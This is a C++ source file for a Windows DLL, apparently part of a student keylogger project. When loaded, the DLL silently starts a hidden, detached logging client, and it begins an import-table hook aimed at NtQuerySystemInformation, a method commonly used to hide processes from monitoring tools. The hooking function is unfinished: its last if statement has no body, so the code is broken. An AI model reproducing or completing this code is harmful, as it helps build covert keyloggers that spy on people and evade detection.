#pragma once
#define DLL_EXPORT


#include <Windows.h>

#include <iostream>
#include <string>
#include <conio.h>
#include "logger.h"
#include <thread>

#define STR_SIZE 1024
#define NAME "C:\\Users\\Magshimim\\Documents\\My Projects\\keylogger\\logClient\\x64\\Debug\\logClient.exe"

extern "C"
{
	DECLDIR void connectAndLog()
	{

        char procFull[STR_SIZE] = {};
        // Get full path of DLL to inject
        DWORD check = GetFullPathNameA(NAME, STR_SIZE, procFull, NULL);

        // Get the length of the required wide string
        int length = MultiByteToWideChar(CP_ACP, 0, procFull, -1, NULL, 0);

        // Allocate memory for the wide string
        wchar_t* wideString = new wchar_t[length];

        // Perform the conversion
        MultiByteToWideChar(CP_ACP, 0, procFull, -1, wideString, length);

        // Set up the STARTUPINFO structure
        STARTUPINFO startupInfo;
        PROCESS_INFORMATION processInfo;

        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_HIDE; // Hide the window

        ZeroMemory(&processInfo, sizeof(processInfo));

        // Create the process
        if (!CreateProcess(
            wideString,   // Application name
            NULL,              // Command line arguments
            NULL,              // Process handle not inheritable
            NULL,              // Thread handle not inheritable
            FALSE,             // Set handle inheritance to FALSE
            DETACHED_PROCESS,                 // No creation flags
            NULL,              // Use parent's environment block
            NULL,              // Use parent's starting directory
            &startupInfo,      // Pointer to STARTUPINFO structure
            &processInfo)      // Pointer to PROCESS_INFORMATION structure
            ) {
            // Handle the error
            std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
            return;
        }
        // Close process and thread handles
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);

	}
    DECLDIR void startHook()
    {
        MODULEINFO modInfo = { 0 };
        HMODULE hModule = GetModuleHandle(0);

        GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

        LPBYTE pAdress = (LPBYTE)modInfo.lpBaseOfDll;
        PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAdress;

        // get start of the modules memory
        PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAdress + pIDH->e_lfanew);
        PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
        PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAdress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        for (; pIID->Characteristics; pIID++)
        {
            if (!strcmp("ntdll.dll", (char*)(pAdress + pIID->Name))) {
                break;
            }
        }

        PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAdress + pIID->OriginalFirstThunk);
        PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAdress + pIID->FirstThunk);
        PIMAGE_IMPORT_BY_NAME pIIBM;

        for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
            pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAdress + pITD->u1.AddressOfData);
            if(!strcmp("NtQuerySystemInformation", (char*)pIIBM->Name))

        }


    }
}


BOOL APIENTRY DllMain(HINSTANCE hModule, // Handle to DLL modul
	DWORD ul_reason_for_call,
	LPVOID lpReserved) // Reserved

{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		connectAndLog();
		break;
	}
	return TRUE;
}

